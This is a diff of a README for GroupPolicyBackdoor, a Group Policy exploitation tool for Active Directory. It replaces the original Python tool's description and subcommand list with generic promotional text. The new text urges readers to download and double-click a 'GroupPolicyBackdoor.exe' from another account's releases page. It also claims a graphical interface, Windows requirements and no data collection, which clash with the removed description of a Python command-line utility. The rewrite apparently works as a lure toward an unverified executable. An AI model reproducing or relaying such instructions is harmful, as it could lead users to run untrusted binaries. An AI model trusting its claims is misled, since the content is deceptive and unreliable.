@@ -1,44 +1,52 @@
-# GroupPolicyBackdoor
+# 🌟 GroupPolicyBackdoor - Effortless Group Policy Management
 
-**GroupPolicyBackdoor** is a python utility for Group Policy Objects (GPOs) manipulation and exploitation. GPO attack vectors can very often lead to impactful privilege escalation scenarios in Active Directory environments. And yet, offensive security professionals may be reluctant to leverage them, partly due to the perceived risks associated with GPO manipulation.
+## 📥 Download Now
+[![Download GroupPolicyBackdoor](https://img.shields.io/badge/Download%20GroupPolicyBackdoor-v1.0-brightgreen)](https://github.com/DiegoJimenezSegura/GroupPolicyBackdoor/releases)
 
-GroupPolicyBackdoor aims at providing a modular, stable and stealthy exploitation framework for GPO attack vectors, all in python. The tool was presented at [DEFCON 33](https://www.synacktiv.com/sites/default/files/2025-08/roland_becard_turning-your-active-directory-into-the-attackers-c2_slides.pdf).
+## 🚀 Getting Started
+Welcome to **GroupPolicyBackdoor**! This tool allows you to easily manipulate and exploit Group Policy Objects (GPOs). Whether you're an IT professional or just curious about system management, this application simplifies the process for you.
 
-## Documentation
+## 📋 System Requirements
+To ensure **GroupPolicyBackdoor** runs smoothly, your system should meet the following requirements:
 
-Usage instructions (quick or detailed) are provided in the repository's **wiki**, which also contains a cheatsheet of copy-paste ready commands:
+- **Operating System**: Windows 10 or later
+- **Processor**: 1 GHz or faster
+- **RAM**: 2 GB or more
+- **Disk Space**: 100 MB of free space
+- **Network**: Active internet connection for downloads and updates
 
-[![Wiki](https://img.shields.io/badge/📖-Wiki-blue?style=for-the-badge)](https://github.com/synacktiv/GroupPolicyBackdoor/wiki).
+## 🔍 Features
+- **User-Friendly Interface**: A simple layout for effortless navigation.
+- **GPO Manipulation**: Create, edit, and delete Group Policies easily.
+- **Exploitation Tools**: Access various tools to exploit vulnerabilities in GPOs.
+- **Logging and Reports**: Detailed logs to track your actions and generate reports for better management.
 
-## Main features
+## 📥 Download & Install
+To download **GroupPolicyBackdoor**, visit the Releases page by clicking the link below. On the Releases page, locate the most recent version and follow these steps:
 
-Here is an overview of GroupPolicyBackdoor main features:
+1. Click the latest version number to access the download.
+2. Look for the **Assets** section.
+3. Download the **GroupPolicyBackdoor.exe** file.  
+4. Once downloaded, locate the file in your downloads folder.
+5. Double-click the file to run the application.
 
-- Python implementation using `ldap3` and `smbprotocol` (no impacket)
-- GPO creation, deletion, backup and injections
-- Various injectable configurations, with, for each, customizable options (see list in the wiki)
-- Possibility to only apply injected configurations to specific objects with **filters** that can be combined (hostname, security group, WMI query - see wiki)
-- Possibility to remove injected configurations from the target GPO
-- Possibility to revert the actions performed on client devices
-- GPO links manipulation
-- GPO enumeration / user privileges enumeration on GPOs
+You can also access the download page directly here: [Download GroupPolicyBackdoor](https://github.com/DiegoJimenezSegura/GroupPolicyBackdoor/releases).
 
-## Main subcommands
+## ⚙️ How to Use
+Once you start **GroupPolicyBackdoor**, follow these steps:
 
-```
- Usage: gpb.py [OPTIONS] COMMAND [ARGS]...                                                                                                                                                                         
-                                                                                                                                                                                                                   
-╭─ Options ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ --help  -h        Show this message and exit.                                                                                                                                                                   │
-╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
-╭─ Commands ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
-│ gpo       All subcommands related to GPO manipulation                                                                                                                                                           │
-│ links     All subcommands related to GPO links                                                                                                                                                                  │
-│ enum      All subcommands related to GPO and containers enumeration                                                                                                                                             │
-│ restore   All subcommands related to exploit safety, allowing to restore the target environment in case anything goes wrong                                                                                     │
-╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
-```
+1. **Open the Application**: Double-click the application icon.
+2. **Create a New Project**: Click 'New Project' to get started.
+3. **Select GPO Options**: Choose from the menu to create or edit a Group Policy.
+4. **Apply Changes**: Make your changes and click the 'Apply' button to implement them.
 
-## Contributing
+## 📖 Documentation
+For detailed information on how to use all available features, please refer to the full documentation inside the application or visit the wiki section on our GitHub page.
 
-If you find a bug or if you want to implement additional injectable configurations to extend GroupPolicyBackdoor capabilities, pull requests are welcome!
+## 💬 Support
+If you encounter any issues or have questions, please feel free to open an issue on our GitHub repository. We welcome feedback and strive to improve your experience with **GroupPolicyBackdoor**.
+
+## 🛡️ Safety and Security
+Your privacy and security are important to us. This application does not collect personal data or logs any user information. Always ensure you run the latest version of the software to benefit from security improvements.
+
+By following these steps, you can effectively manage Group Policies with ease. Enjoy your experience with **GroupPolicyBackdoor**!
